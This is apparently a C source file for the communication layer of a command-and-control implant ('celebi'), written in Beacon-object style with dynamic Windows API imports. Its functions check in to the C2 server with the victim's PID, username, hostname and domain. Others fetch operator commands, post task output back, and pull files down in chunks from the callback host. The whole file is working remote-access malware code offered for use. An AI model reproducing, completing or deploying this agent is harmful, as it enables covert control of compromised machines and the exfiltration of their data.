#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);

WINBASEAPI void MSVCRT$free(void *ptr);

/*
 *
 * CHECKIN LOGIC
 *
*/

char *generate_checkin_message(CheckinRequest *checkin) {
	// Allocate space and construct the serialized checkin message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Payload UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = checkin->payload_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_CHECKIN);
	
	// 4 bytes for the PID.
	pack_uint(msg, &offset, checkin->pid);
	
	// Optional string fields.
	pack_string(msg, &offset, checkin->username);
	pack_string(msg, &offset, checkin->hostname);
	pack_string(msg, &offset, checkin->domain);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = unpack_char(decoded_body, &offset);
	
	reply->callback_uuid = unpack_str(decoded_body, &offset);
	reply->status = unpack_str(decoded_body, &offset);
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_checkin_request(CheckinRequest *request) {
	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
	if (request->domain != NULL) { KERNEL32$VirtualFree(request->domain, 0, MEM_RELEASE); }
}

void free_checkin_reply(CheckinReply *reply) {
	if (reply->callback_uuid != NULL) { KERNEL32$VirtualFree(reply->callback_uuid, 0, MEM_RELEASE); }
	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
}

void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = clone_str(state->params.payload_uuid);
	
	// Use the checkin PICO to gather basic situational awareness info, if possible.
	cap->CheckinPicoEntrypoint(&checkin);
	
	// Send checkin payload to C2 server.
	char *msg = generate_checkin_message(&checkin);
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_checkin_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	free_checkin_request(&checkin);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
}

/*
 *
 * TASKING LOGIC
 *
*/

char *generate_tasking_message(TaskingRequest *tasking) {
	// Allocate space and construct the serialized tasking message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = tasking->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_TASKING);
	
	// 1 byte for the tasking size.
	pack_char(msg, &offset, tasking->tasking_size);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = unpack_char(decoded_body, &offset);	
	reply->tasking_size = unpack_char(decoded_body, &offset);
	
	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < reply->tasking_size; i++) {
		TaskInfo task = { 0 };
		
		task.id = unpack_str(decoded_body, &offset);
		task.command = unpack_str(decoded_body, &offset);
		task.parameters = unpack_str(decoded_body, &offset);
		task.timestamp = unpack_int(decoded_body, &offset);
		
		reply->tasks[i] = task;
	}
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_tasking_request(TaskingRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
}

void free_tasking_reply(TaskingReply *reply) {
	if (reply->tasks != NULL) {
		for (int i = 0; i < reply->tasking_size; i++) {
			KERNEL32$VirtualFree(reply->tasks[i].id, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].command, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].parameters, 0, MEM_RELEASE);
		}
		KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE);
	}
}

void perform_tasking(AgentState *state, TaskingReply *reply) {
	// Generate tasking payload.
	TaskingRequest tasking = { 0 };
	tasking.callback_uuid = clone_str(state->params.callback_uuid);
	tasking.tasking_size = 1;
	char *msg = generate_tasking_message(&tasking);
	
	// Send tasking payload to C2 server.
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_tasking_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	free_tasking_request(&tasking);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
}

/*
 *
 * POST LOGIC
 *
*/

char *generate_post_message(TaskPostRequest *post) {
	// Allocate space and construct the serialized post_response message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = post->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_POST);

	// String fields.
	pack_string(msg, &offset, post->task_id);
	pack_string(msg, &offset, post->task_output);
	pack_string(msg, &offset, post->task_status);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void free_post_request(TaskPostRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
	if (request->task_id != NULL) { KERNEL32$VirtualFree(request->task_id, 0, MEM_RELEASE); }
	if (request->task_output != NULL) { KERNEL32$VirtualFree(request->task_output, 0, MEM_RELEASE); }
	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
}

void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status) {
	// Generate post payload.
	TaskPostRequest post = { 0 };
	post.callback_uuid = clone_str(state->params.callback_uuid);
	post.task_id = clone_str(task->id);
	post.task_output = output;
	post.task_status = status;
	char *msg = generate_post_message(&post);
	
	// Send post payload to C2 server.
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// Currently there is no resubmission logic for if the C2 throws an error, so don't bother parsing the response.
	reply->success = response.status_code == 200 ? 1 : 0;
	
	// Free unneeded allocations.
	free_post_request(&post);
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
}

/*
 *
 * UPLOAD LOGIC
 *
 * In this context, we mean "uploading" from the C2 server TO the agent.
 *
*/

UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid) {
	UploadManager upload = { 0 };
	
	upload.callback_uuid = clone_str(callback_uuid);
	upload.task_id = clone_str(task_id);
	upload.file_uuid = clone_str(file_uuid);
	upload.chunk_size = FILE_CHUNK_SIZE;
	upload.next_chunk = 1;
	upload.current_buffer = KERNEL32$VirtualAlloc(0, FILE_CHUNK_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	upload.buflen = 0;
	upload.bufsize = FILE_CHUNK_SIZE;
	upload.finished = FALSE;
	upload.error = FALSE;
	
	return upload;
}

char *generate_upload_message(UploadManager *upload) {
	// Allocate space and construct the serialized upload message.
	
	int len = 1024;
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = upload->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	pack_char(msg, &offset, MESSAGE_TYPE_UPLOAD);
	
	// Task and file ID.
	pack_string(msg, &offset, upload->task_id);
	pack_string(msg, &offset, upload->file_uuid);
	
	// Chunk information.
	pack_uint(msg, &offset, upload->chunk_size);
	pack_uint(msg, &offset, upload->next_chunk);
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_upload_reply(HttpResponse *response, UploadManager *upload) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 1; // skip over the message type byte
	
	int total_chunks = unpack_int(decoded_body, &offset);
	upload->next_chunk = unpack_int(decoded_body, &offset) + 1;
	
	if (upload->next_chunk > total_chunks) {
		upload->finished = TRUE;
	}
	
	char *encoded_chunk_data = unpack_str(decoded_body, &offset);
	char *decoded_chunk_data = KERNEL32$VirtualAlloc(0, upload->chunk_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(encoded_chunk_data, MSVCRT$strlen(encoded_chunk_data), decoded_chunk_data);
	
	// If there isn't enough capacity, reallocate the buffer.
	if ((upload->buflen + upload->chunk_size) > upload->bufsize) {
		char *new_buffer = KERNEL32$VirtualAlloc(0, upload->bufsize + upload->chunk_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < upload->buflen; i++) {
			new_buffer[i] = upload->current_buffer[i];
		}
		KERNEL32$VirtualFree(upload->current_buffer, 0, MEM_RELEASE);
		upload->current_buffer = new_buffer;
		upload->bufsize += upload->chunk_size;
		
	}
	
	// Copy the data across.
	for (int i = 0; i < upload->chunk_size; i++) {
		upload->current_buffer[upload->buflen + i] = decoded_chunk_data[i];
	}
	upload->buflen += upload->chunk_size;
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(decoded_chunk_data, 0, MEM_RELEASE);
}

void free_upload_manager(UploadManager *upload) {
	if (upload->callback_uuid != NULL) { KERNEL32$VirtualFree(upload->callback_uuid, 0, MEM_RELEASE); }
	if (upload->task_id != NULL) { KERNEL32$VirtualFree(upload->task_id, 0, MEM_RELEASE); }
	if (upload->file_uuid != NULL) { KERNEL32$VirtualFree(upload->file_uuid, 0, MEM_RELEASE); }
	if (upload->current_buffer != NULL) { KERNEL32$VirtualFree(upload->current_buffer, 0, MEM_RELEASE); }
}

BOOL perform_upload(AgentState *state, UploadManager *upload) {
	// Generate upload payload.
	char *msg = generate_upload_message(upload);
	
	// Send upload payload to C2 server.
	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	if (result == TRUE && response.status_code == 200) {
		parse_upload_reply(&response, upload);
	} else {
		result = FALSE;
	}
	
	// Free unneeded allocations.
	// Unlike the other perform_x() functions, we don't need to free the upload manager because it will be reused!
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	
	return result;
}
